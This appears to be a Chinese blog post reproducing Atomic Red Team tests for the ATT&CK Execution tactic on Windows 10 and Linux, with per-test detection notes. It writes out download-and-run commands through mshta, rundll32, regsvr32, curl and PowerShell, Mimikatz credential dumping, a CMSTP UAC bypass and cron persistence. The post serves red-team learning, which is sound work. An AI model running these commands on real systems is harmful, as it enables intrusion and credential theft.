---
layout: post
title: 跟着ATT&CK学安全之execution
excerpt: "跟着ATT&CK学安全之execution"
categories: [ATT&CK]
comments: true
---

### T1059 - Command-Line Interface
这个没什么好说的,就是一个命令行运行文件

平台:Linux,运行如下命令
```bash
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
或者
bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
```
成功复现
### T1191 - CMSTP
Microsoft Connection Manager Profile Installer (CMSTP.exe)是一个安装连接管理配置的应用程序.它允许接受一个INF文件作为参数,安装一个服务,来进行远程连接.红队可用CMSTP.exe和inf文件来生成恶意命令.CMSTP.exe现在拒绝从远程加载dll,但由于CMSTP.exe是一个合法的程序,且有微软的签名,这个运行仍然可以绕过基于白名单和AppLocker的防御.

CMSTP.exe也可以通过COM接口绕过UAC来执行二进制文件

关于用户账户控制(UAC):UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。例如选择总是通知将会:
- 当程序试图安装软件或对电脑做出更改时通知你。
- 当你对 Windows 设置进行更改时通知你。
- 冻结其他任务，直到你做出响应。
###### 测试1 CMSTP 运行远程脚本
平台:Windows.运行方式如下`cmstp.exe /s T1191.inf`

检测:通过procmon的process name = cmstp  并且createfile contained calc.exe,检测到了这次行动

window10运行复现
###### 测试2 CMSTP运行绕过UAC
红队可通过向inf文件中植入RunPreSetupCommandsSection来调用cmd.exe,来绕过UAC
```bash
cmstp.exe /s T1191_uacbypass.inf /au
```
检测:通过procmon的process name = cmstp  并且createfile contained calc.exe,检测到了这次行动

window10运行复现
### T1223 - Compiled HTML File
编译的html文件(.chm)可运行如下:HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.并通过hh.exe来打开他们,红队可用chm文件来隐藏一段payload,此技术也可以来绕过一些检测病毒检测.运行如下命令,或者直接打开文件
```
hh.exe D:\pycharmproject\atomic-red-team-master\atomics\T1223\src\T1223.chm
```
通过procmon的hh.exe进行了process create操作,监控到了

windows10上成功复现

或者
```bash
hh.exe http://snappyzz.com/T1223.chm		\\这个没有成功复现
```
### T1196 - Control Panel Items
控制面板允许用户查看和修改电脑配置,也可以将cpl文件作为参数,运行恶意文件,来绕过一些病毒检测
```bash
control.exe D:\pycharmproject\atomic-red-team-master\atomics\T1196\bin\calc.cpl	//这里cpl一定要采用绝对路径否则失败
```

检测:control.exe创建了rundll32进程,然后rundll32进程通过命令行参数运行了cpl代码,然后运行里calc

windows10上运行复现
### T1173 - Dynamic Data Exchange
关于动态数据交换（DDE, Dynamic Data Exchange）:DDE是一种动态数据交换机制（Dynamic Data Exchange，DDE）。使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。客户机应用程序向当前所激活的服务器应用程序发送一条消息请求信息，服务器应用程序根据该信息作出应答，从而实现两个程序之间的数据交换。红队可用DDE来运行二进制命令,微软的文档可以用来放入DDE命令

新建一个Word文档，通过Ctrl+F9添加一个域，然后修改域代码为：
```bash
DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe" 
```
这个没有成功复现
### Execution through API
红队工具可以直接调用windows的api,例如如下api可以直接运行二进制
```
CreateProcessA() and CreateProcessW(),
CreateProcessAsUserA() and CreateProcessAsUserW(),
CreateProcessInternalA() and CreateProcessInternalW(),
CreateProcessWithLogonW(), CreateProcessWithTokenW(),
LoadLibraryA() and LoadLibraryW(),
LoadLibraryExA() and LoadLibraryExW(),
LoadModule(),
LoadPackagedLibrary(),
WinExec(),
ShellExecuteA() and ShellExecuteW(),
ShellExecuteExA() and ShellExecuteExW()
```
检测:监视API调用可能会产生大量数据，并且除非在特定情况下进行收集，否则可能无法直接用于防御，因为对Windows API函数（例如CreateProcess）的良性使用是常见的并且很难与恶意行为区分开。使用API​​监视将其他事件与围绕API函数调用的行为相关联，将为事件提供额外的上下文，可以帮助确定事件是否归因于恶意行为。
### Exploitation for Client Execution
就是利用客户端应用的漏洞,通常分为浏览器,办公软件和第三方软件

检测:通过监控Adobe Reader和Flash,浏览器,和excel等进程的异常行为,包括写入磁盘的可疑文件,进程注入等,进行发现
### Graphical User Interface
这个就是通过图形界面双击运行文件什么的

检测:只能通过查看登陆日志等进行发现
### T1118 - InstallUtil
这个就是一个安装和卸载的组件

CSC就是 C-Sharp Compiler (中文就是C#编译器)，作用是把我们的 cs 源文件变异成dll 或者是exe
###### 测试1 InstallUtil uninstall method call
运行如下生成dll并且运行这个dll
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
例如
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:D:\pycharmproject\atomic-red-team-master\atomics\T1118\src\aa.dll  D:\pycharmproject\atomic-red-team-master\atomics\T1118\src\T1118.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U D:\pycharmproject\atomic-red-team-master\atomics\T1118\src\aa.dll
```
检测的内容大概就是监控csc.exe和InstallUtil.exe这两个进程

win10成功复现
### T1170 - Mshta
Mshta.exe是用来运行Microsoft HTML Applications (HTA)的.HTA是一个独立的应用,使用的和浏览器同样的技术,但是独立与浏览器.红队和用它来运行Javascript 或者VBScript.它可以用来绕过白名单的防护,也可以绕过浏览器安全防护
##### 测试1 Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
```bash
mshta.exe javascript:a=(GetObject("script:http://snappyzz.com/mshta.sct")).Exec();close();
```
windows10上成功复现
##### 测试2 Mshta calls a local VBScript file to launch notepad.exe
```bash
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""C:\Windows\SysWOW64\calc.exe"")(window.close)")
```
windows10上成功复现
##### 测试3 Mshta executes VBScript to execute malicious command
运行本地的VB脚本通过powershell枚举用户
```bash
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file D:\pycharmproject\atomic-red-team-master\atomics\T1170\src\powershell.ps1"":close")
```
windows10上运行成功
##### 测试4 Mshta Executes Remote HTML Application (HTA)
```bash
mshta.exe http://snappyzz.com/T1170.hta
```
windows10上运行成功
#### T1086 - PowerShell
##### 测试1 下载Mimikatz并dump credentials
```bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
windows10上运行成功
##### 测试2 
下载Bloodhound并运行
```bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.com/SharpHound.ps1'); Invoke-BloodHound"
```
被win10防病毒拦下
未完待续

### T1064 - Scripting
这个太简单了把
##### 测试1 在linux上运行脚本
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
```
windows10上运行成功
##### 测试2 在windows上运行脚本
```
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > #{script_to_create}
C:\Windows\system32\cmd.exe /Q /c #{script_to_create}
```
清除
```
del #{script_to_create}
```
windows10上运行成功
### T1121 - Regsvcs/Regasm
Regsvcs和Regasm是用来注册.NET COM的命令行工具.都有微软的签名.红队可以使用它们来运行程序.
###### 测试1 Regasm Uninstall Method Call Test
注意使用绝对路径
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
例如
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.dll
```
检测方法也是类似regasm.exe这种进程名称的监控

win10成功复现
###### 测试2 Regsvs Uninstall Method Call Test
在powershell中运行
```
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
例如
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.dll
```
检测方法也是类似regasm.exe这种进程名称的监控

win10成功复现
### T1117 - Regsvr32
Regsvr32.exe是一个命令行程序,用来注册和删除object linking和嵌入命令,加载dll. Regsvr32也可以用来运行二进制文件.

红队可以利用它来运行代码来绕过一些防护,其中Regsvr32也是一个有微软签名的文件

regsvr32.exe也可以加载COM scriptlets来运行dll,regsvr32也可以加载远程文件来运行.regsvr32也通过Component Object Model Hijacking用来注册 COM Object来进行persistence
###### 测试1 Regsvr32 local COM scriptlet execution
```
regsvr32.exe /s /u /i:C:\Users\zhang\Desktop\atomic-red-team-master\atomics\T1117\RegSvr32.sct scrobj.dll
```
win10成功复现
###### 测试2 Regsvr32 remote COM scriptlet execution
```
regsvr32.exe /s /u /i:http://snappyzz.com/RegSvr32.sct scrobj.dll
```
win10成功复现
###### 测试3 Regsvr32 local DLL execution
```
"IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll) ELSE ( regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll )"
```
项目找不到dll文件,没有进行复现,应该是有个命令创建dll的懒得找了
### T1085 - Rundll32
rundll32.exe可以用来调用二进制文件.红队可以利用这个特点调用恶意软件来绕过系统防护,rundll32.exe也可以运行.cpl文件,双击.cpl文件也可以造成rundll32.exe的运行.

Rundll32 也可以运行JavaScript,语法类似如下
```
rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"
```
###### 测试1 Rundll32 execute JavaScript Remote Payload With GetObject
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://snappyzz.com/T1085.sct").Exec();
```
win10成功复现
###### 测试2 Rundll32 execute VBscript command
```
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
```
win10成功复现
###### 测试3 Rundll32 advpack.dll Execution
```
rundll32.exe advpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
```
win10成功复现
###### 测试4 Rundll32 ieadvpack.dll Execution
```
rundll32.exe ieadvpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
```
**没有复现成功**
###### 测试5 Rundll32 syssetup.dll Execution
```
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
```
win10成功复现
###### 测试6 Rundll32 setupapi.dll Execution
```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
```
**没有复现成功**
#### T1216 - Signed Script Proxy Execution
带有证书的脚本可以用来执行恶意文件
这个也未完待续
### T1154 - Trap
Trap命令允许程序和shell在收到interrupt命令后执行特定的命令.一种常见的情况是脚本允许终止和处理常见的键盘中断，如`ctrl+c`和`ctrl+d`,攻击者可以利用这点来注册代码,当shell被打断的时候运行.trap的格式是`trap 'command list' signals` 这表示程序收到signals时运行command list.
###### 测试1 Trap
```
trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
```
成功复现
### T1151 - Space after Filename
红队可以修改文件的扩展名来迷惑蓝队.在macOS系统上,如果一个程序命名为"evil.txt ",由于最后的空格,双击它之后,它将作为二进制文件被运行

平台:macOS
```
1. echo '#!/bin/bash\necho "print "hello, world!"" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt

2. mv execute.txt "execute.txt "

3. ./execute.txt\

```
### T1153 - Source
`source`命令可以在当前的shell中加载函数或在当前的目录下运行文件.命令类似`source /path/to/filename [arguments]`或者`. /path/to/filename [arguments]`.注意那个`.`后的空格,如果没有那个空格,程序就不会在当前目录下运行.这通常用来使某个shell可以使用某些特性或功能，或者更新特定的shell环境。

红队可以使用这个技术来运行文件,且运行的文件不需要被标记为可执行文件.
###### 测试1 Execute Script using Source
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
source /tmp/art.sh
```
成功复现
###### 测试2 Execute Script using Source Alias
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
. /tmp/art.sh
```
成功复现
### T1168 - Local Job Scheduling
对于cron:通过修改`/etc/crontab`文件和`/etc/cron.d/`文件夹或其他支持cron的位置来创建cron jobs

对于at:也可以调度程序和script在xx时间之后.

对于launchd:只在macOS上可以实现,暂时跳过
###### 测试1 Cron - Replace crontab with referenced file
```
echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
例如
echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
```
成功复现
###### 测试2 Cron - Add script to cron folder
```
echo "#{command}" > /etc/cron.daily/#{cron_script_name}
```
成功复现
### T1035 - Service Execution
红队可以通过windows服务来运行代码
###### 测试1 Execute a Command as a Service
```
sc.exe create mortytest binPath= E:\pythonProject\atomic-red-team\atomics\T1050\bin\AtomicService.exe
sc.exe start mortytest
sc.exe delete mortytest
```
window10运行成功
###### 测试2 Use PsExec to execute a command on a remote host
```
PsExec.exe \\localhost "C:\Windows\System32\calc.exe"
```
window10成功复现
```
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
New-Item -ItemType Directory ("C:\Windows\System32\calc.exe") -Force | Out-Null
Copy-Item $env:TEMP\PsTools\PsExec.exe "C:\Windows\System32\calc.exe" -Force
```
应该是可以
### T1053 - Scheduled Task
###### 测试1 Scheduled task
```bash
schtasks /create /TN taskname /ST 11:56 /sc once /TR "calc"
```
监控:Schedule是以svchost进程的形式存在,通过监控那个svchost的processCreate行为,可以看到监控到

win10成功复现
###### 测试2 Scheduled task Remote
```
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
```
监控:监控同上

应该是可以
###### 测试3 Powershell Cmdlet Scheduled Task
登录后运行task
```
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
```
监控:监控同上

win10成功复现
### T1220 - XSL Script Processing
Extensible Stylesheet Language (XSL)是用来描述和渲染XML文件的.为了进行复杂的操作,XSL增加了不同的语言.红队可以使用它来运行二进制代码绕过白名单的检查.和Trusted Developer Utilities相似,msxsl.exe可以在本地或者远程运行JavaScript,虽然msxsl.exe不是默认安装了,但是红队可以打包它并放在客户端.msxsl.exe运行时接收两个参数,XML源文件和XSL stylesheet.既然xsl文件也是一个xml,红队可以使用xsl文件两次,当msxsl.exe运行的时候,红队可以给xml/xsl文件任意的扩展名

命令行的例子如下:

- msxsl.exe customers[.]xml script[.]xsl
- msxsl.exe script[.]xsl script[.]xsl
- msxsl.exe script[.]jpeg script[.]jpeg

另一种技术叫做Squiblytwo,它使用windows管理工具调用JScript或VBScript在xsl文件中,这个技术也可以执行远程或本地的script.和Regsvr32一样,Squiblydoo也是一个windows信任的工具

命令行的例子如下:

- Local File: wmic process list /FORMAT:evil[.]xsl
- Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”
###### 测试1 MSXSL Bypass using local files
首先需要下载工具https://www.microsoft.com/en-us/download/details.aspx?id=21714
```
C:\Windows\Temp\msxsl.exe msxslxmlfile.xml msxslscript.xsl
```
win10成功复现(关闭病毒防护)
###### 测试2 
```
msxsl.exe http://snappyzz.com/msxslxmlfile.xml http://snappyzz.com/msxslscript.xsl
```
win10成功复现(关闭病毒防护)

剩下两个没有复现成功